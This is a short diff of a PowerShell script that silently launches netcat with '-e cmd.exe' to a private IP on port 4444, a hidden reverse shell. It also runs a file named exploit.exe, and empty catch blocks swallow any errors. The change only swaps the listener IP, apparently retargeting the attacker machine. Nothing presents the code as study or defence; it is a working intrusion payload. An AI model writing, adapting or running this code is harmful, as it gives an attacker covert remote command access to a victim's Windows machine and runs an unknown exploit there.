@@ -18,7 +18,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 192.168.0.105 4444 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 192.168.0.112 4444 -e cmd.exe", 0, $false)
     $WshShell.Run("`"$NcPath1`"./exploit.exe", 0, $false)
 } catch {}
 
